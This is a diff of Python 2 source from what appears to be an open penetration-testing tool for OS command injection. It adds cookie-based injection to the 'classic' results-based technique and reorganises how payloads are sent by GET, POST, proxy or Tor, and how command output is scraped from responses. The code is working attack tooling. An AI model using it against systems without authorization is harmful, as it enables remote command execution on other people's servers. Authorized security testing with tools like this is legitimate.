@@ -35,18 +35,17 @@ from src.core.requests import parameters
 
 from src.core.injections.results_based.techniques.classic import cb_payloads
 
-
 """
   The "classic" technique on Result-based OS Command Injection.
 """
 
-#-----------------------------------------
+# ------------------------------------
 # Check if target host is vulnerable.
-#-----------------------------------------
-def injection_test(payload, http_request_method, url):
-                      
+# ------------------------------------
+def injection_test(payload, http_request_method, url):           
   # Check if defined method is GET (Default).
   if http_request_method == "GET":
+    
     # Check if its not specified the 'INJECT_HERE' tag
     url = parameters.do_GET_check(url)
     
@@ -125,9 +124,9 @@ def injection_test(payload, http_request_method, url):
   return response, vuln_parameter
 
  
-#-------------------------
+# ------------------------
 # Evaluate test results.
-#-------------------------
+# ------------------------
 def injection_test_results(response, TAG, randvcalc):
   
   # Check the execution results
@@ -138,9 +137,20 @@ def injection_test_results(response, TAG, randvcalc):
   return shell
 
 
-#----------------------------------------------
-# # The main command injection exploitation.
-#----------------------------------------------
+# --------------------------------------------------------------
+# Check if target host is vulnerable.(Cookie-based injection)
+# --------------------------------------------------------------
+def cookie_injection_test(url, vuln_parameter, payload):
+  request = urllib2.build_opener()
+  request.addheaders.append(('Cookie', vuln_parameter + "=" + payload))
+  response = request.open(url)
+  
+  return response
+
+
+# -------------------------------------------
+# The main command injection exploitation.
+# -------------------------------------------
 def injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell):
 
   if alter_shell:
@@ -162,92 +172,94 @@ def injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_meth
   # Check if defined "--verbose" option.
   if menu.options.verbose:
     sys.stdout.write("\n" + Fore.GREY + payload + Style.RESET_ALL)
-    
-  # Check if defined method is GET (Default).
-  if http_request_method == "GET":
-    # Check if its not specified the 'INJECT_HERE' tag
-    url = parameters.do_GET_check(url)
-    
-    target = re.sub(settings.INJECT_TAG, payload, url)
-    vuln_parameter = ''.join(vuln_parameter)
-    request = urllib2.Request(target)
-    
-    # Check if defined extra headers.
-    headers.do_check(request)        
+
+  # Check if defined cookie with "INJECT_HERE" tag
+  if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
+    response = cookie_injection_test(url, vuln_parameter, payload)
+
+  else:
+    # Check if defined method is GET (Default).
+    if http_request_method == "GET":
+      # Check if its not specified the 'INJECT_HERE' tag
+      url = parameters.do_GET_check(url)
       
-    # Check if defined any HTTP Proxy.
-    if menu.options.proxy:
-      try:
-        response = proxy.use_proxy(request)
-      except urllib2.HTTPError, err:
-        print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
-        raise SystemExit() 
-
-    # Check if defined Tor.
-    elif menu.options.tor:
-      try:
-        response = tor.use_tor(request)
-      except urllib2.HTTPError, err:
-        print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
-        raise SystemExit() 
-
-    else:
-      try:
-        response = urllib2.urlopen(request)
-      except urllib2.HTTPError, err:
-        print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
-        raise SystemExit() 
+      target = re.sub(settings.INJECT_TAG, payload, url)
+      vuln_parameter = ''.join(vuln_parameter)
+      request = urllib2.Request(target)
+      
+      # Check if defined extra headers.
+      headers.do_check(request)        
         
-  else :
-    # Check if defined method is POST.
-    parameter = menu.options.data
-    parameter = urllib2.unquote(parameter)
-    
-    # Check if its not specified the 'INJECT_HERE' tag
-    parameter = parameters.do_POST_check(parameter)
-    
-    data = re.sub(settings.INJECT_TAG, payload, parameter)
-    request = urllib2.Request(url, data)
-    
-    # Check if defined extra headers.
-    headers.do_check(request)
+      # Check if defined any HTTP Proxy.
+      if menu.options.proxy:
+        try:
+          response = proxy.use_proxy(request)
+        except urllib2.HTTPError, err:
+          print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+          raise SystemExit() 
+
+      # Check if defined Tor.
+      elif menu.options.tor:
+        try:
+          response = tor.use_tor(request)
+        except urllib2.HTTPError, err:
+          print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+          raise SystemExit() 
+
+      else:
+        try:
+          response = urllib2.urlopen(request)
+        except urllib2.HTTPError, err:
+          print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+          raise SystemExit() 
+          
+    else :
+      # Check if defined method is POST.
+      parameter = menu.options.data
+      parameter = urllib2.unquote(parameter)
       
-    # Check if defined any HTTP Proxy.
-    if menu.options.proxy:
-      try:
-        response = proxy.use_proxy(request)
-      except urllib2.HTTPError, err:
-        print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
-        raise SystemExit() 
+      # Check if its not specified the 'INJECT_HERE' tag
+      parameter = parameters.do_POST_check(parameter)
+      
+      data = re.sub(settings.INJECT_TAG, payload, parameter)
+      request = urllib2.Request(url, data)
+      
+      # Check if defined extra headers.
+      headers.do_check(request)
+        
+      # Check if defined any HTTP Proxy.
+      if menu.options.proxy:
+        try:
+          response = proxy.use_proxy(request)
+        except urllib2.HTTPError, err:
+          print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+          raise SystemExit() 
 
-    # Check if defined Tor.
-    elif menu.options.tor:
-      try:
-        response = tor.use_tor(request)
-      except urllib2.HTTPError, err:
-        print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
-        raise SystemExit() 
+      # Check if defined Tor.
+      elif menu.options.tor:
+        try:
+          response = tor.use_tor(request)
+        except urllib2.HTTPError, err:
+          print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+          raise SystemExit() 
 
-    else:
-      try:
-        response = urllib2.urlopen(request)
-      except urllib2.HTTPError, err:
-        print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
-        raise SystemExit() 
+      else:
+        try:
+          response = urllib2.urlopen(request)
+        except urllib2.HTTPError, err:
+          print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+          raise SystemExit() 
         
   return response
 
-#-----------------------------
-# Command execution results.
-#-----------------------------
-def injection_results(response, TAG):
 
+# --------------------------------
+# The command execution results.
+# --------------------------------
+def injection_results(response, TAG):
   # Grab execution results
   html_data = response.read()
   shell = re.findall(r"" + TAG + TAG + "(.*)" + TAG + TAG + "", html_data)
   if len(shell) > 1:
     shell = shell[0]
   return shell
-
-
-#eof
